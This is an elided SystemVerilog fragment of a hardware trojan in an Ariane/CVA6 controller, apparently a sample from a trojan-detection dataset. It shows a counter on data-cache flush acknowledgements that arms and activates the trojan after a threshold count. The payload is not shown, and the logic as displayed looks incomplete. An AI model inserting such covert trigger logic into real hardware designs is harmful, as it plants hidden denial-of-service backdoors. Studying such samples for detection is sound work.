...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19912;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|flush_dcache_ack_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && ex_valid_i) trojan_active <= 1'b1;
        end
    end
...
module controller_trojan_Availability
  import ariane_pkg::*;
#(
